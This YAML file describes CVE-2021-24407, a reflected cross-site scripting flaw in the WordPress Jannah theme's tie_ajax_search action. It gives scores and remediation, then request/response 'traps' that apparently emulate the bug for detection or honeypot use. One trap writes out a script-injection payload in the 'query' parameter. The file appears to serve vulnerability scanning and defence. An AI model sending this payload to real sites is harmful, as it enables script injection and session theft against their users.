id: CVE-2021-24407
info:
  name: WordPress Jannah Theme <5.4.5 - Cross-Site Scripting
  author: pikpikcu
  description: WordPress Jannah theme before 5.4.5 contains a reflected cross-site
    scripting vulnerability. It does not properly sanitize the 'query' POST parameter
    in its tie_ajax_search AJAX action.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  remediation: 'Update the Jannah Theme to version 5.4.5 or later, which includes
    proper input sanitization to mitigate the XSS vulnerability.

    '
  reference:
  - https://wpscan.com/vulnerability/fba9f010-1202-4eea-a6f5-78865c084153
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24407
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-24407
    cwe-id: CWE-79
    epss-score: 0.00207
    epss-percentile: 0.58055
    cpe: cpe:2.3:a:tielabs:jannah:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: tielabs
    product: jannah
    framework: wordpress
  tags: cve2021,cve,wordpress,xss,wp-theme,wpscan,tielabs
traps:
- request:
    method: GET
    path: /
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: /wp-content/themes/jannah/assets/attachment-jannah-image-
- request:
    method: POST
    path: /wp-admin/admin-ajax.php
    headers: {}
    body: 'action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>

      '
  response:
    status_code: 200
    headers: {}
    body: </script><script>alert(document.domain)</script>
